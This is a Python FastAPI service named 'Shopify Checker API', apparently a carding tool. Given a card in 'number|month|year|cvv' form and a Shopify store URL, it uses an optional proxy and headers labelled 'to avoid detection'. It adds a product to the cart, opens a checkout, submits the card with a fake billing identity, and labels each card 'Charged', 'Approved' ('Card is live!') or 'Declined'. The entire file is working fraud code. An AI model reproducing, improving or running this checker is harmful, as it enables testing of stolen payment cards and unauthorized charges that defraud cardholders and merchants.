from fastapi import FastAPI, HTTPException, Query, Depends
from fastapi.responses import JSONResponse
from fastapi.middleware.cors import CORSMiddleware
import httpx
import uvicorn
from typing import Optional, Dict, Any
import re
import json
import asyncio
from datetime import datetime
import random

app = FastAPI(title="Shopify Checker API")

# Enable CORS
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Headers to avoid detection
DEFAULT_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Accept": "application/json",
    "Accept-Language": "en-US,en;q=0.9",
    "Content-Type": "application/json",
    "Origin": "https://checkout.shopify.com",
    "Referer": "https://checkout.shopify.com/",
}

class ShopifyChecker:
    def __init__(self):
        self.client = None
    
    async def get_client(self, proxy: Optional[str] = None):
        """Create HTTPX client with optional proxy"""
        proxies = None
        if proxy:
            proxies = proxy
        
        return httpx.AsyncClient(
            headers=DEFAULT_HEADERS,
            proxies=proxies,
            timeout=httpx.Timeout(30.0),
            follow_redirects=True
        )
    
    async def extract_product_id(self, store_url: str, client: httpx.AsyncClient) -> Optional[str]:
        """Extract a product ID from the store's product page"""
        try:
            # Try to get products from storefront API
            storefront_url = f"https://{store_url}/products.json?limit=1"
            response = await client.get(storefront_url)
            
            if response.status_code == 200:
                data = response.json()
                products = data.get('products', [])
                if products:
                    variant_id = products[0].get('variants', [{}])[0].get('id')
                    if variant_id:
                        return str(variant_id)
            
            # Fallback: try to find any product
            response = await client.get(f"https://{store_url}")
            # Look for product URL pattern
            product_match = re.search(r'/products/([a-zA-Z0-9_-]+)', response.text)
            if product_match:
                product_handle = product_match.group(1)
                return product_handle
                
        except Exception as e:
            print(f"Error extracting product: {e}")
        return None
    
    async def add_to_cart(self, store_url: str, variant_id: str, client: httpx.AsyncClient) -> Optional[str]:
        """Add product to cart and get cart token"""
        try:
            cart_url = f"https://{store_url}/cart/add.js"
            payload = {
                "id": variant_id,
                "quantity": 1
            }
            
            response = await client.post(cart_url, json=payload)
            
            if response.status_code == 200:
                data = response.json()
                return data.get('token')
        except Exception as e:
            print(f"Error adding to cart: {e}")
        return None
    
    async def create_checkout(self, store_url: str, cart_token: str, client: httpx.AsyncClient) -> Optional[Dict]:
        """Create checkout from cart"""
        try:
            checkout_url = f"https://{store_url}/cart/{cart_token}/checkout"
            response = await client.get(checkout_url)
            
            # Extract checkout token from URL
            checkout_match = re.search(r'/checkouts/([a-zA-Z0-9_-]+)', str(response.url))
            if checkout_match:
                checkout_token = checkout_match.group(1)
                return {
                    "token": checkout_token,
                    "checkout_url": str(response.url)
                }
        except Exception as e:
            print(f"Error creating checkout: {e}")
        return None
    
    async def get_checkout_data(self, store_url: str, checkout_token: str, client: httpx.AsyncClient) -> Optional[Dict]:
        """Get checkout data (including payment gateway)"""
        try:
            api_url = f"https://{store_url}/checkouts/{checkout_token}.json"
            response = await client.get(api_url)
            
            if response.status_code == 200:
                data = response.json()
                checkout = data.get('checkout', {})
                return {
                    "payment_gateway": checkout.get('payment_gateway'),
                    "total_price": checkout.get('total_price'),
                    "currency": checkout.get('currency'),
                    "available_gateways": [
                        gw.get('name') for gw in checkout.get('available_payment_gateways', [])
                    ]
                }
        except Exception as e:
            print(f"Error getting checkout data: {e}")
        return None
    
    async def submit_payment(
        self, 
        store_url: str, 
        checkout_token: str, 
        card_number: str, 
        month: str, 
        year: str, 
        cvv: str,
        client: httpx.AsyncClient
    ) -> Dict:
        """Submit payment to Shopify checkout"""
        
        # Step 1: Get checkout page to extract authenticity token
        checkout_page_url = f"https://{store_url}/checkouts/{checkout_token}"
        page_response = await client.get(checkout_page_url)
        
        # Extract authenticity token (required for payment submission)
        auth_token_match = re.search(
            r'name="authenticity_token" value="([^"]+)"', 
            page_response.text
        )
        authenticity_token = auth_token_match.group(1) if auth_token_match else ""
        
        # Extract payment gateway ID
        gateway_match = re.search(
            r'data-payment-gateway-id="([^"]+)"', 
            page_response.text
        )
        gateway_id = gateway_match.group(1) if gateway_match else "shopify_payments"
        
        # Step 2: Submit payment
        payment_url = f"https://{store_url}/checkouts/{checkout_token}/payments"
        
        # Format card number without spaces
        clean_card = re.sub(r'\s', '', card_number)
        
        payment_data = {
            "authenticity_token": authenticity_token,
            "payment_gateway_id": gateway_id,
            "credit_card": {
                "number": clean_card,
                "name": "Card Holder",
                "month": month.zfill(2),
                "year": year if len(year) == 4 else f"20{year}",
                "verification_value": cvv
            },
            "billing_address": {
                "first_name": "John",
                "last_name": "Doe",
                "address1": "123 Main St",
                "city": "New York",
                "province": "NY",
                "zip": "10001",
                "country": "US",
                "phone": "1234567890"
            }
        }
        
        response = await client.post(payment_url, json=payment_data)
        
        # Step 3: Parse response
        try:
            result = response.json()
            
            # Check for success
            if result.get('success') or result.get('payment_processed'):
                return {
                    "Response": "Order completed successfully! 💎",
                    "Price": result.get('total_price', "$0.00"),
                    "Gate": "Shopify Payments",
                    "Status": "Charged"
                }
            
            # Check for specific errors
            error_message = result.get('description', '')
            errors = result.get('errors', {})
            
            if "cvv" in str(errors).lower() or "cvc" in str(errors).lower():
                return {
                    "Response": "Invalid CVV / CVC code",
                    "Price": "-",
                    "Gate": "Shopify Payments",
                    "Status": "Declined"
                }
            elif "number" in str(errors).lower():
                return {
                    "Response": "Invalid card number",
                    "Price": "-",
                    "Gate": "Shopify Payments",
                    "Status": "Declined"
                }
            elif "expiry" in str(errors).lower():
                return {
                    "Response": "Card has expired",
                    "Price": "-",
                    "Gate": "Shopify Payments",
                    "Status": "Declined"
                }
            elif "insufficient" in str(errors).lower() or "funds" in str(errors).lower():
                return {
                    "Response": "Insufficient funds - Card is live!",
                    "Price": result.get('total_price', "$0.00"),
                    "Gate": "Shopify Payments",
                    "Status": "Approved"
                }
            else:
                return {
                    "Response": error_message[:200] if error_message else "Payment declined",
                    "Price": "-",
                    "Gate": "Shopify Payments",
                    "Status": "Declined"
                }
                
        except json.JSONDecodeError:
            # Parse HTML response
            if "thank you" in response.text.lower() or "order confirmed" in response.text.lower():
                return {
                    "Response": "Order completed successfully! 💎",
                    "Price": "Contact admin",
                    "Gate": "Shopify Payments",
                    "Status": "Charged"
                }
            elif "cvv" in response.text.lower():
                return {
                    "Response": "Invalid CVV / CVC code",
                    "Price": "-",
                    "Gate": "Shopify Payments",
                    "Status": "Declined"
                }
            else:
                return {
                    "Response": "Payment processing failed",
                    "Price": "-",
                    "Gate": "Shopify Payments",
                    "Status": "Declined"
                }

checker = ShopifyChecker()

@app.get("/")
async def check_card(
    cc: str = Query(..., description="Card in format: number|month|year|cvv"),
    url: str = Query(..., description="Shopify store URL"),
    proxy: Optional[str] = Query(None, description="Proxy: ip:port (optional)")
):
    """
    Check if a credit card works on a Shopify store
    """
    try:
        # Parse card details
        parts = cc.split('|')
        if len(parts) != 4:
            return JSONResponse({
                "Response": "ERROR: Invalid card format. Use number|month|year|cvv",
                "Price": "-",
                "Gate": "Shopify"
            })
        
        card_number, month, year, cvv = parts
        year = year[-2:] if len(year) > 2 else year
        
        # Clean store URL
        store_url = url.replace("https://", "").replace("http://", "").rstrip("/")
        
        # Create client with proxy if provided
        async with await checker.get_client(proxy) as client:
            
            # Step 1: Get product ID
            variant_id = await checker.extract_product_id(store_url, client)
            if not variant_id:
                return JSONResponse({
                    "Response": "Error: Could not find product on store",
                    "Price": "-",
                    "Gate": "Shopify"
                })
            
            # Step 2: Add to cart
            cart_token = await checker.add_to_cart(store_url, variant_id, client)
            if not cart_token:
                return JSONResponse({
                    "Response": "Error: Could not add product to cart",
                    "Price": "-",
                    "Gate": "Shopify"
                })
            
            # Step 3: Create checkout
            checkout_info = await checker.create_checkout(store_url, cart_token, client)
            if not checkout_info:
                return JSONResponse({
                    "Response": "Error: Could not create checkout",
                    "Price": "-",
                    "Gate": "Shopify"
                })
            
            # Step 4: Submit payment
            result = await checker.submit_payment(
                store_url, 
                checkout_info['token'],
                card_number, month, year, cvv,
                client
            )
            
            return JSONResponse(result)
            
    except httpx.TimeoutException:
        return JSONResponse({
            "Response": "Timeout - Check your proxy or try again",
            "Price": "-",
            "Gate": "Shopify"
        })
    except Exception as e:
        return JSONResponse({
            "Response": f"Error: {str(e)[:100]}",
            "Price": "-",
            "Gate": "Shopify"
        })

@app.get("/health")
async def health_check():
    """Health check endpoint"""
    return {"status": "healthy", "timestamp": datetime.now().isoformat()}

if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=8080, reload=False)
